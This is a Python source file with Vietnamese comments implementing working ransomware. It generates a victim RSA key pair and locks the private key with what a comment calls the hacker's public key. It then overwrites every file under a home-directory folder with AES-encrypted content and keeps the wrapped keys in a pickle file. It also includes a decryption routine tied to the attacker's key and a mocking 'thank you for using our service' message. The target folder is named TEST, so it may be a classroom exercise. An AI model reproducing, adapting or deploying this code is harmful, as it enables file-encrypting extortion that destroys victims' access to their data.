from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import AES , PKCS1_OAEP
from Cryptodome.Random import get_random_bytes
import base64
import os
import gc # thư viện giúp thu hồi bộ nhớ
import pickle #phương pháp tuần tự hóa (serialization)
from wlog import check_log, update_log


################-Khu vực tạo ra các thứ hay ho -#######################
rsa_key = RSA.generate(2048)
#Cặp khóa của client
client_private_key  = rsa_key.export_key()
client_public_key   = rsa_key.publickey().export_key()
#Tạo danh sách các file đã mã hóa - dạng directory
encrypted_filenames = dict()
#######################################################################



def list_all_files(directory):
    files_list = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            if os.path.isfile(file_path):
                files_list.append(file_path)
    return files_list


def encrypt_data_file(aes_key, data):
    # Khởi tạo một đối tượng AES với chế độ EAX
    cipher = AES.new(aes_key, AES.MODE_EAX)
    # Lưu trữ nonce (số duy nhất được sử dụng một lần) do đối tượng AES tạo ra
    nonce = cipher.nonce
    # Mã hóa dữ liệu và tạo tag xác thực
    ciphertext, tag = cipher.encrypt_and_digest(data)
    # Kết hợp nonce, tag và ciphertext, sau đó mã hóa chúng thành chuỗi base64 để trả về
    return base64.b64encode(nonce + tag + ciphertext).decode('utf-8')


# Mã hóa khóa bí mật của client bằng khóa công khai của hacker
# Chia khóa bí mật của client thành các đoạn nhỏ để mã hóa
def encrypt_client_private_key (server_public_key):
    chunk_size=190
    cipher = PKCS1_OAEP.new(RSA.import_key(server_public_key))
    encrypted_chunks = []
    for i in range(0, len(client_private_key), chunk_size):
        chunk = client_private_key[i:i+chunk_size]
        encrypted_chunks.append(cipher.encrypt(chunk))
    encrypted_client_private_key =  b''.join(encrypted_chunks)
    #Lưu nó lại 
    with open('encrypted_client_private_key.key', 'wb') as ecp_key:
        ecp_key.write(encrypted_client_private_key)



def encrypt_file(server_public_key):
    try:
        encrypt_client_private_key(server_public_key)
        #Mã hóa từng file 
        for file_path in list_all_files(os.path.expanduser('~/TEST')):
            # Tạo key ngẫu nhiên (AES-256)
            aes_key  = get_random_bytes(32)

            # Mở file lấy nội dung
            with open(file_path, 'rb+') as file:
                data = file.read()

                # Mã hóa nội dung
                encrypted_file = encrypt_data_file(aes_key, data)

                # Di chuyển con trỏ tệp về đầu tệp
                file.seek(0)
            
                # Xóa toàn bộ nội dung tệp
                file.truncate()

                # Ghi đè nội dung đã mã hóa vào file
                file.write(bytes(encrypted_file, "utf-8"))
            
            # Mã hóa AES key dùng khóa công khai của client
            cipher2 = PKCS1_OAEP.new(RSA.import_key(client_public_key))
            encrypted_aes_key = cipher2.encrypt(aes_key)

            #Lưu file - key
            encrypted_filenames[file_path]=encrypted_aes_key
            
            # Xóa key
            del aes_key
            #Gom rác thải
            gc.collect()

        with open('encrypted_files.pkl', 'wb') as files:
            # Di chuyển con trỏ tệp về đầu tệp
            files.seek(0)

            # Xóa toàn bộ nội dung tệp
            files.truncate()

            pickle.dump(encrypted_filenames, files)
    except Exception as e:
        print(e)



#-------------------------------------------------------------------------------------------
def decrypt_client_private_key(server_private_key, encrypted_client_private_key):
    try:
        chunk_size = 256
        cipher = PKCS1_OAEP.new(RSA.import_key(server_private_key))
        decrypted_chunks = []
        
        for i in range(0, len(encrypted_client_private_key), chunk_size):
            chunk = encrypted_client_private_key[i:i+chunk_size]
            decrypted_chunks.append(cipher.decrypt(chunk))
            
        decrypted_client_private_key = b''.join(decrypted_chunks)
        return decrypted_client_private_key
    except Exception as e:
        print(e)
        return b'Key_Error'


def decrypt_data_file(aes_key, data):
    # Giải mã base64 để lấy lại nonce, tag và ciphertext
    encrypted_data_bytes = base64.b64decode(data)
    nonce = encrypted_data_bytes[:16]
    tag = encrypted_data_bytes[16:32]
    ciphertext = encrypted_data_bytes[32:]

    # Khởi tạo đối tượng AES với chế độ EAX và nonce đã lưu
    cipher = AES.new(aes_key, AES.MODE_EAX, nonce=nonce)

    # Giải mã dữ liệu và xác thực tag
    try:
        data = cipher.decrypt_and_verify(ciphertext, tag)
        return data
    except ValueError:
        return "Lỗi key hoặc dữ liệu bị chỉnh sửa"


def decrypt_file(server_private_key):
    try:
        #Lấy key đã mã hóa của client
        with open('encrypted_client_private_key.key', 'rb') as ecp_key:
            encrypted_client_private_key = ecp_key.read()

        #Lấy danh sách các aes key và file đã mã hóa của client
        with open('encrypted_files.pkl', 'rb') as file:
            encrypted_AES_file_keys = pickle.load(file)

        #Giải lấy ra key RSA gốc của client  
        client_private_key = decrypt_client_private_key(server_private_key,encrypted_client_private_key)
        if b'Key_Error' in client_private_key:
            raise Exception("Key lỗi hoặc bị hỏng! Vui lòng kiểm tra lại\n")


        for file_path, encrypted_AES_key in encrypted_AES_file_keys.items():
            if os.path.exists(file_path):
                #Giải AES key dùng khóa bí mật của client
                cipher2 = PKCS1_OAEP.new(RSA.import_key(client_private_key))
                decrypted_aes_key = cipher2.decrypt(encrypted_AES_key)

                # Mở file lấy nội dung đã mã hóa
                with open(file_path, 'rb+') as file:
                    data = file.read()

                    # Giải mã nội dung
                    decrypted_file = decrypt_data_file(decrypted_aes_key, data)

                    # Di chuyển con trỏ tệp về đầu tệp
                    file.seek(0)
                
                    # Xóa toàn bộ nội dung tệp
                    file.truncate()

                    # Ghi đè nội dung đã giải mã vào file
                    file.write(decrypted_file)
    except Exception as e:
        return str(e)
    else:
        os.remove('encrypted_files.pkl')
        os.remove('encrypted_client_private_key.key')
        update_log(0)
        return "Giải mã thành công!\n Cám ơn bạn đã sử dụng dịch vụ!\n Nếu hài lòng, vui lòng đánh giá 5 sao để được giảm giá cho lần tiếp theo "






def main_process(key):
    if check_log() == 1:
        return decrypt_file(key)
    else:
        update_log(1)
        encrypt_file(key)